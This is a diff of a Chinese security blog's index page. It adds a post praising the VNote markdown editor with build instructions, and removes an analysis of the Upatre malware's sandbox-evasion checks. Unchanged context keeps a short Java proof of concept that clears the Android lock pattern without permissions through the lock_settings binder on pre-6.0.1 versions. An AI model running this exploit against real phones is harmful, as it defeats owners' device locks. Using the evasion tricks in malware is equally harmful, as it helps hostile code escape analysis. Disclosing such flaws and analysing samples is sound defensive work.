@@ -129,7 +129,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">34</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -192,6 +192,114 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/25/vnote/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/03/25/vnote/" class="post-title-link" itemprop="url">Markdown 笔记软件： VNote</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-03-25 10:27:01" itemprop="dateCreated datePublished" datetime="2020-03-25T10:27:01+08:00">2020-03-25</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>向大家安利一款 markdown 笔记软件， VNote  <a target="_blank" rel="noopener" href="http://t.cn/RXj6L39">http://t.cn/RXj6L39</a><br>此软件目前已经 1300 多个commits 了，做为一个有些开源软件维护经历的人，深感不易。<br>用了太多 markdown 笔记软件，此软件使得最为顺手，尤其作为程序员 vim 模式 让我感到非常舒服，<br>大量图表的支持比如 UML 流程图，让我用起来很顺手。</p>
+<p><img src="https://raw.githubusercontent.com/henices/pictures/master/vnote.png" alt="VNote"></p>
+<p>我前后尝试过各种笔记软件，我理想的软件有几点：</p>
+<ul>
+<li>a. 支持文件管理</li>
+<li>b. 不要乱改数据，容易迁移</li>
+<li>c. 支持 markdown</li>
+<li>d. 跨平台，支持 Mac 和 Linux</li>
+</ul>
+<p>最后，终于发现了 VNote，有点惊喜。在 Linux 下编译 VNote 显示有明显改进，下面是编译的方法：</p>
+<ol>
+<li>下载 QT SDK</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run">https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run</a></p>
+<p>将 Qt5.9 安装到 /home/henices/Qt5.9.0/</p>
+<ol start="2">
+<li>编译 fcitx-qt5</li>
+</ol>
+<p>git clone <a target="_blank" rel="noopener" href="https://gitlab.com/fcitx/fcitx-qt5.git">https://gitlab.com/fcitx/fcitx-qt5.git</a></p>
+<p>准备编译脚本 <code>build_linux.sh</code>， 指定下载的QT</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">QTDIR=<span class="string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span></span><br><span class="line">PATH=<span class="string">&quot;<span class="variable">$QTDIR</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line">LDFLAGS=-L<span class="variable">$QTDIR</span>/lib</span><br><span class="line">CPPFLAGS=-I<span class="variable">$QTDIR</span>/include</span><br><span class="line"></span><br><span class="line">rm -rf build</span><br><span class="line">mkdir -p build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ..</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>
+
+<p>使用下面命令编译</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x ./build_linux.sh</span><br><span class="line">./build_linux.sh</span><br></pre></td></tr></table></figure>
+
+<p>将生成的 libfcitxplatforminputcontextplugin.so copy 到<br><code>/home/henices/Qt5.9.0/5.9/gcc_64/plugins/platforminputcontexts/</code></p>
+<ol start="3">
+<li>获取VNote 源码</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tamlok/vnote.git vnote.git</span><br><span class="line"><span class="built_in">cd</span> vnote.git</span><br><span class="line">git submodule update --init</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>编译</li>
+</ol>
+<p>build_linux.sh</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QTDIR=<span class="string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span></span><br><span class="line">PATH=<span class="string">&quot;<span class="variable">$QTDIR</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line">LDFLAGS=-L<span class="variable">$QTDIR</span>/lib</span><br><span class="line">CPPFLAGS=-I<span class="variable">$QTDIR</span>/include</span><br><span class="line"></span><br><span class="line">rm -rf build</span><br><span class="line">mkdir -p build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">qmake -v</span><br><span class="line">qmake PREFIX=/usr/<span class="built_in">local</span> CONFIG-=debug CONFIG+=release ../VNote.pro</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>
+
+<p>使用下面命令编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x ./build_linux.sh</span><br><span class="line">./build_linux.sh</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>安装</li>
+</ol>
+<p><code>sudo make install</code></p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md">https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -739,7 +847,7 @@
 
 <h3 id="2）-Android-6-0-1-MOB3OM-手势密码清除漏洞"><a href="#2）-Android-6-0-1-MOB3OM-手势密码清除漏洞" class="headerlink" title="2） Android 6.0.1 MOB3OM 手势密码清除漏洞"></a>2） Android 6.0.1 MOB3OM 手势密码清除漏洞</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">attack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	IBinder serviceBinder = getIBinder(<span class="string">&quot;lock_settings&quot;</span>);</span><br><span class="line"></span><br><span class="line">	Parcel data1 = Parcel.obtain();</span><br><span class="line">	Parcel reply1 = Parcel.obtain();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());</span><br><span class="line">		data1.writeByteArray(<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">255</span>]);</span><br><span class="line">		serviceBinder.transact(<span class="number">7</span>, data1, reply1, <span class="number">0</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (RemoteException e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> IBinder <span class="title">getIBinder</span><span class="params">(String service)</span> </span>&#123;</span><br><span class="line">	IBinder serviceBinder = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		serviceBinder = (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">				.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="keyword">null</span>, service);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> serviceBinder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>在Android 6.0.1 MOB3OM 之前的一些版本中, 未在setLockPattern 中做权限检查,<br>导致apk 不需要任何权限就可以将手势密码清除. </p>
-<p>这个问题已经修复 author Jim Miller <a href="mailto:&#x6a;&#x61;&#x67;&#x67;&#x69;&#101;&#115;&#x40;&#x67;&#111;&#x6f;&#x67;&#108;&#101;&#x2e;&#x63;&#x6f;&#x6d;">&#x6a;&#x61;&#x67;&#x67;&#x69;&#101;&#115;&#x40;&#x67;&#111;&#x6f;&#x67;&#108;&#101;&#x2e;&#x63;&#x6f;&#x6d;</a>    Wed Apr 13 16:35:36 2016 -0700</p>
+<p>这个问题已经修复 author Jim Miller <a href="mailto:&#x6a;&#x61;&#x67;&#x67;&#105;&#101;&#115;&#x40;&#103;&#x6f;&#x6f;&#x67;&#x6c;&#x65;&#46;&#x63;&#111;&#x6d;">&#x6a;&#x61;&#x67;&#x67;&#105;&#101;&#115;&#x40;&#103;&#x6f;&#x6f;&#x67;&#x6c;&#x65;&#46;&#x63;&#111;&#x6d;</a>    Wed Apr 13 16:35:36 2016 -0700</p>
 <p><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0">https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0</a></p>
 <p>但是考虑到Android 的碎片化问题, 估计在一些手机中将存在这个问题. </p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
@@ -1040,83 +1148,6 @@
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
 <li>[1] <a target="_blank" rel="noopener" href="https://appvigil.co/blog/intent-spoofing-vulnerability-in-android-apps/">Intent Spoofing Vulnerability in Android Apps – OWASP Top 10</a></li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/anti_sandbox/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="henices">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/03/19/anti_sandbox/" class="post-title-link" itemprop="url">一些反沙盒的新技术</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Upatre 使用了一些新的逃逸技术来逃逸动态沙盒引擎的检查，这些技巧都非常的简单，但<br>是非常的有效果。事实上，VirusTotal上Upatre的检出率并不高，新变种出来基本都检测不<br>出来，说明现在的恶意软件对付杀毒软件是越来越有办法了。</p>
-<p>目前在恶意软件上加壳倒是越来越少了，因为加壳容易引起杀软引擎的注意，相反地目前的<br>恶意软件大量使用边执行边修改自身代码的方法来躲避杀软，不执行的话看起来就像是一个<br>正常的软件，而真正执行起来代码却全变了，这也算是一种进化。</p>
-<p>下面说说两种最近遇到的沙盒逃逸的办法，样本md5: ac3558b973402ef6a27e03c391f20533</p>
-<h2 id="检查开机时间"><a href="#检查开机时间" class="headerlink" title="检查开机时间"></a>检查开机时间</h2><p>一般使用沙盒的分析引擎的做法都是安装一个全新的系统，做系统镜像。然后在检查的时候<br>加载镜像，执行样本。而开机的时间往往都被忽略了，基本都不会超过10分钟。</p>
-<p>Upatre 样本所采取的方法是利用GetTickCount 获取开机的毫秒数，当开机时间小于12分钟<br>是就不执行恶意的行为。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">004013B3    BB D8FE0A00         MOV EBX,0AFED8</span><br><span class="line">004013B8    FF55 DC             CALL DWORD PTR SS:[EBP-24]   ; kernel32.GetTickCount</span><br><span class="line">004013BB    3BC3                CMP EAX,EBX</span><br><span class="line">004013BD    0F82 6F020000       JB 00401632</span><br><span class="line"></span><br><span class="line">00401632    6A 00               PUSH 0</span><br><span class="line">00401634    FF55 F4             CALL DWORD PTR SS:[EBP-C]    ; kernel32.ExitProcess</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>0xAFED8 是 720600毫秒 12分钟多一点，不到进程退出了。</p>
-<h2 id="检查鼠标位置"><a href="#检查鼠标位置" class="headerlink" title="检查鼠标位置"></a>检查鼠标位置</h2><p>Upatre样本使用的第二种沙盒逃逸的方法是检查鼠标位置的变化，动态沙盒分析系统大多是<br>自动化的系统，也就是不使用鼠标，如果Upatre样本检查到鼠标的位置没有发生变化，同样<br>不会执行恶意行为。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0040197C   8D85 04FFFFFF       lea eax,dword ptr ss:[ebp-0xFC]</span><br><span class="line">00401982   50                  push eax</span><br><span class="line">00401983   FF95 20FFFFFF       call dword ptr ss:[ebp-0xE0]      ;  user32.GetCursorPos</span><br><span class="line">00401989   8D85 0CFFFFFF       lea eax,dword ptr ss:[ebp-0xF4]</span><br><span class="line">0040198F   50                  push eax</span><br><span class="line">00401990   FF95 20FFFFFF       call dword ptr ss:[ebp-0xE0]      ;  user32.GetCursorPos</span><br><span class="line">00401996   8B85 04FFFFFF       mov eax,dword ptr ss:[ebp-0xFC]</span><br><span class="line">0040199C   8B9D 0CFFFFFF       mov ebx,dword ptr ss:[ebp-0xF4]</span><br><span class="line">004019A2   39D8                cmp eax,ebx</span><br><span class="line">004019A4   74 D6               je short 62.0040197C</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>只要鼠标一动就退出循环，继续往下执行。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近出现的样本在反动态沙盒检测方面明显地进化了，针对性极强，不再局限于古老的<br>IsDebuggerPresent，而是利用PEB检查CPU核数等技术办法来检测，沙盒对抗估技术在后面<br>的日子里一定会更加迅速的进化。</p>
-<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>非常感谢西安研究中心的同事提供的样本，同时感谢同事lzx在样本分析时给予的大力支持。</p>
 
       
     </div>
